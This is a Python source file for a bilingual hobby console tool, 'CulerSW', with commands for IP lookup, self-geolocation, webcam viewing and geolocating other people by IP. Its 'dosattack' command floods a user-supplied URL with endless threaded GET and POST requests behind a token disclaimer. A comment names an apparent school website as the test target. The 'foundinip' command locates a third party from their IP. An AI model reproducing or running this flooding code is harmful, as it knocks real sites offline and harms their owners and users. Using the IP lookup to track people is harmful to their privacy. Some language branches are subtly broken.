# -*- coding: utf-8 -*-
import os
import stun
import geocoder
import cv2
import threading
import requests
import colorama
import webbrowser
import random
import json
folder = "~"
print(f"{colorama.Fore.RED}CulerSW {colorama.Fore.BLUE}v0.0.3{colorama.Fore.GREEN}")
language = {}
with open("settings.json", "r") as file:
	language = json.load(file)
if (language["language"] == "en"):
	print("for help enter: line -h")
elif (language["language"] == "ru"):
	print("Для помощи введите: line -h")
while True:
	with open("settings.json", "r") as file:
		language = json.load(file)
	command = input(f"[{folder}] $ ")
	if "cd " in command:
		os.system(command)
		folder = command.replace("cd ","")
	elif command == "clear":
		os.system("cls")
	elif command == "getip":
		print(stun.get_ip_info()[1])
	elif command == "getlocation":
		print(f"Location : \n{geocoder.ip('me')}\n Geolocation : \n{geocoder.ip('me').latlng[0]},{geocoder.ip('me').latlng[1]}")
	elif command == "openlocation":
		webbrowser.open_new_tab(f"https://www.google.com.ua/maps/place/{geocoder.ip('me').latlng[0]},{geocoder.ip('me').latlng[1]}")
	elif command == "getcamera":
		cap = cv2.VideoCapture(0)
		while cap.isOpened():
			success, img = cap.read()
			img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
			cv2.imshow("Camera", img)
			if cv2.waitKey(1) & 0xff == ord('x'):
				break
		cap.release()
		cv2.destroyAllWindows()
	elif command == "dosattack":
		# For test: https://12school.com.ua
		if (language["language"] == "en"):
			print("Do not use this command for malicious intent? you are responsible your own affairs. Are you sure to do this?\n[Yes/y][No/n]")
		elif (language["language"] == "en"):
			print("Не использовать эту команду со злым умыслом? вы отвечаете за свои дела. Вы уверены, что сделаете это?\n[Yes/y][No/n]")
		chosed = input("$ ")
		if chosed == "y":
			url = input("[url] $ ")
			def dos():
				while True:
					try:
						requests.get(url)
						requests.post(url)
						print(colorama.Fore.YELLOW + "Request sent! " + colorama.Fore.RED + url) 
					except requests.exceptions.ConnectionError: 
						print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!") 
					except requests.exceptions.MissingSchema:
						break
						if (language["language"] == "en"):
							print(f"Not found website {str(url)}")
						if (language["language"] == "en"):
							print(f"Сайт не найден {str(url)}")
			while True:
				threading.Thread(target=dos).start()
	elif command == "settings":
		if (language["language"] == "en"):
			chossel = input("Select language [en/english][ru/russian] ")
			if (chossel == "en"):
				language["language"] = "en"
				with open("settings.json", "w", encoding="utf-8") as jfile:
					json.dump(language, jfile, sort_keys=False)
			elif (chossel == "ru"):
				language["language"] = "ru"
				with open("settings.json", "w", encoding="utf-8") as jfile:
					json.dump(language, jfile, sort_keys=False)
		elif (language["language"] == "ru"):
			chossel = input("Выбирите язык [en/english][ru/russian] ")
			if (chossel == "en"):
				language["language"] = "en"
				with open("settings.json", "w", encoding="utf-8") as jfile:
					json.dump(language, jfile, sort_keys=False)
			elif (chossel == "ru"):
				language["language"] = "ru"
				with open("settings.json", "w", encoding="utf-8") as jfile:
					json.dump(language, jfile, sort_keys=False)
	elif command == "foundinip":
		if (language["language"] == "en"):
			print("Do not use this command for malicious intent? you are responsible your own affairs. Are you sure to do this?\n[Yes/y][No/n]")
		elif (language["language"] == "ru"):
			print("Не использовать эту команду со злым умыслом? вы отвечаете за свои дела. Вы уверены, что сделаете это?\n[Yes/y][No/n]")
		chosed = input("$ ")
		if chosed == "y":
			IP = input("[IP] $ ")
			print(str(geocoder.ip(IP).latlng[0])+", "+str(geocoder.ip(IP).latlng[1]))
			if (language["language"] == "en"):
				print("Open in browser\n[Yes/y][No/n]")
			if (language["language"] == "en"):
				print("Открыть в браузере\n[Yes/y][No/n]")
			chosse = input("$ ")
			if chosse == "y":
				webbrowser.open_new_tab(f"https://www.google.com.ua/maps/place/{geocoder.ip(IP).latlng[0]}, {geocoder.ip(IP).latlng[1]}")
	elif command == "line --help" or command == "line -h":
		if (language["language"] == "en"):
			print("getip - get ip")
			print("getlocation - get geolocation")
			print("openlocation - open google map with your location")
			print("getcamera - open window with camera image")
			print("dosattack - dos attack to website")
			print("foundinip - get geolocation with user ip")
			print("settings - edit settings")
			print("clear - clear the window")
		elif (language["language"] == "ru"):
			print("getip - получить свой ip")
			print("getlocation - полйчить свою геолокацию")
			print("openlocation - открыть на google карте свое местоположение")
			print("getcamera - открыть окно с изображением с камеры")
			print("dosattack - dos атака на сайт")
			print("foundinip - получить геолокацию человека по его ip")
			print("settings - изменить настройки")
			print("clear - очистить окно")
	else:
		os.system(command)
